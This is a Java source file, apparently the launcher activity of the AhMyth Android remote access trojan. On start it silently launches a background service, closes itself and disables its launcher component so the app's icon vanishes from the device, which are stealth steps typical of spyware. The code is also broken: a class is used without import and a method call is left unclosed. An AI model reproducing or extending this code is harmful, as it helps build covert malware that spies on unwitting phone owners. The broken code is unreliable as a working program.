package ahmyth.mine.king.ahmyth;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.hardware.Camera;
import android.os.Bundle;
import android.util.Log;
import android.view.View;
import android.widget.Toast;



public class MainActivity extends Activity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startService(new Intent(this, MainService.class));
        finish();
        fn_hideicon();
    }
    

    private void fn_hideicon() {
            PackageManager pm = getPackageManager();
        ComponentName cm = new ComponentName(MainActivity.this,MainActivity.class);
        pm.setComponentEnabledSetting(cm,
                pm.COMPONENT_ENABLED_STATE_DISABLED,
                pm.DONT_KILL_APP
    }
}
